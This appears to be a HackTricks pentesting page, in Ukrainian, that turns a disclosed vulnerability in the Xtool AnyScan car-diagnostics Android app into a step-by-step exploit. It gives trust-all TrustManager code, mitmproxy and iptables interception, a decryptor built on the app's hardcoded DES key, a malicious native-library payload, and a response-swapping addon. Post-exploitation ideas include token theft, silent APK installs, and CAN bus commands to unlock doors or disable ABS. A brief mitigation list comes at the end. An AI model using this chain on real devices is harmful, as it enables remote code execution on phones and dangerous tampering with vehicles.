# Небезпечні механізми оновлення в додатках – віддалене виконання коду через шкідливі плагіни

{{#include ../../banners/hacktricks-training.md}}

Багато Android-додатків реалізують **свої власні канали оновлення “плагінів” або “динамічних функцій”** замість використання Google Play Store. Коли реалізація є небезпечною, зловмисник, здатний перехопити трафік, може надати **произвольний нативний код, який буде завантажено в процес додатка**, що призводить до повного віддаленого виконання коду (RCE) на пристрої – і в деяких випадках на будь-якому зовнішньому пристрої, контрольованому додатком (автомобілі, IoT, медичні пристрої …).

Ця сторінка підсумовує реальний ланцюг вразливостей, виявлений у додатку для автомобільної діагностики Xtool **AnyScan** (v4.40.11 → 4.40.40) і узагальнює техніку, щоб ви могли перевірити інші Android-додатки та використати неправильну конфігурацію під час участі в червоній команді.

---
## 1. Визначення небезпечного TLS TrustManager

1. Декомпілюйте APK за допомогою jadx / apktool і знайдіть стек мережі (OkHttp, HttpUrlConnection, Retrofit…).
2. Шукайте **кастомний `TrustManager`** або `HostnameVerifier`, який сліпо довіряє кожному сертифікату:
```java
public static TrustManager[] buildTrustManagers() {
return new TrustManager[]{
new X509TrustManager() {
public void checkClientTrusted(X509Certificate[] chain, String authType) {}
public void checkServerTrusted(X509Certificate[] chain, String authType) {}
public X509Certificate[] getAcceptedIssuers() {return new X509Certificate[]{};}
}
};
}
```
3. Якщо присутній, програма прийме **будь-який TLS сертифікат** → ви можете запустити прозорий **MITM проксі** з самопідписаним сертифікатом:
```bash
mitmproxy -p 8080 -s addon.py  # see §4
iptables -t nat -A OUTPUT -p tcp --dport 443 -j REDIRECT --to-ports 8080  # on rooted device / emulator
```
## 2. Реверс-інжиніринг метаданих оновлення

У випадку AnyScan кожен запуск програми викликає HTTPS GET до:
```
https://apigw.xtoolconnect.com/uhdsvc/UpgradeService.asmx/GetUpdateListEx
```
Тіло відповіді є **XML документом**, в якому вузли `<FileData>` містять **Base64-кодовані, DES-ECB зашифровані** JSON, що описує кожен доступний плагін.

Типові кроки для пошуку:
1. Знайти криптографічну рутину (наприклад, `RemoteServiceProxy`) і відновити:
* алгоритм (DES / AES / RC4 …)
* режим роботи (ECB / CBC / GCM …)
* зашитий ключ / IV (часто 56-бітні DES ключі або 128-бітні AES ключі в константах)
2. Реалізувати функцію на Python для розшифрування / шифрування метаданих:
```python
from Crypto.Cipher import DES
from base64 import b64decode, b64encode

KEY = IV = b"\x2A\x10\x2A\x10\x2A\x10\x2A"  # 56-bit key observed in AnyScan

def decrypt_metadata(data_b64: str) -> bytes:
cipher = DES.new(KEY, DES.MODE_ECB)
return cipher.decrypt(b64decode(data_b64))

def encrypt_metadata(plaintext: bytes) -> str:
cipher = DES.new(KEY, DES.MODE_ECB)
return b64encode(cipher.encrypt(plaintext.ljust((len(plaintext)+7)//8*8, b"\x00"))).decode()
```
## 3. Створіть шкідливий плагін

1. Виберіть будь-який легітимний ZIP плагін і замініть рідну бібліотеку на ваш вантаж:
```c
// libscan_x64.so – constructor runs as soon as the library is loaded
__attribute__((constructor))
void init(void){
__android_log_print(ANDROID_LOG_INFO, "PWNED", "Exploit loaded! uid=%d", getuid());
// spawn reverse shell, drop file, etc.
}
```

```bash
$ aarch64-linux-android-gcc -shared -fPIC payload.c -o libscan_x64.so
$ zip -r PWNED.zip libscan_x64.so assets/ meta.txt
```
2. Оновіть метадані JSON так, щоб `"FileName" : "PWNED.zip"` і `"DownloadURL"` вказували на ваш HTTP сервер.  
3. Зашифруйте DES + закодуйте в Base64 змінений JSON і вставте його назад у перехоплений XML.

## 4. Доставте Payload за допомогою mitmproxy

`addon.py` приклад, який *безшумно* замінює оригінальні метадані:
```python
from mitmproxy import http
MOD_XML = open("fake_metadata.xml", "rb").read()

def request(flow: http.HTTPFlow):
if b"/UpgradeService.asmx/GetUpdateListEx" in flow.request.path:
flow.response = http.Response.make(
200,
MOD_XML,
{"Content-Type": "text/xml"}
)
```
Запустіть простий веб-сервер для хостингу шкідливого ZIP:
```bash
python3 -m http.server 8000 --directory ./payloads
```
Коли жертва запускає додаток, він буде:
* отримувати наш підроблений XML через канал MITM;
* розшифровувати та парсити його за допомогою жорстко закодованого DES ключа;
* завантажувати `PWNED.zip` → розпаковувати в приватному сховищі;
* `dlopen()` включену *libscan_x64.so*, миттєво виконуючи наш код **з дозволами додатка** (камера, GPS, Bluetooth, файловий система тощо).

Оскільки плагін кешується на диску, бекдор **зберігається після перезавантажень** і запускається щоразу, коли користувач вибирає відповідну функцію.

## 5. Ідеї після експлуатації

* Вкрасти сесійні куки, токени OAuth або JWT, збережені додатком.
* Скинути APK другого етапу та тихо встановити його через `pm install` (додаток вже має `REQUEST_INSTALL_PACKAGES`).
* Зловживати будь-яким підключеним обладнанням – у сценарії AnyScan ви можете надсилати довільні **OBD-II / CAN bus команди** (відкрити двері, вимкнути ABS тощо).

---
### Перелік виявлення та пом'якшення (синя команда)

* НІКОЛИ не відправляйте виробничу версію з кастомним TrustManager/HostnameVerifier, який вимикає перевірку сертифікатів.
* Не завантажуйте виконуваний код ззовні Google Play. Якщо ви *повинні*, підписуйте кожен плагін тим самим **apkSigning v2** ключем і перевіряйте підпис перед завантаженням.
* Замініть слабку/жорстко закодовану криптографію на **AES-GCM** та серверний обертовий ключ.
* Перевіряйте цілісність завантажених архівів (підпис або принаймні SHA-256).

---
## Посилання

- [NowSecure – Виявлено віддалене виконання коду в додатку Xtool AnyScan](https://www.nowsecure.com/blog/2025/07/16/remote-code-execution-discovered-in-xtool-anyscan-app-risks-to-phones-and-vehicles/)
- [Android – Небезпечні шаблони TrustManager](https://developer.android.com/privacy-and-security/risks/unsafe-trustmanager)

{{#include ../../banners/hacktricks-training.md}}
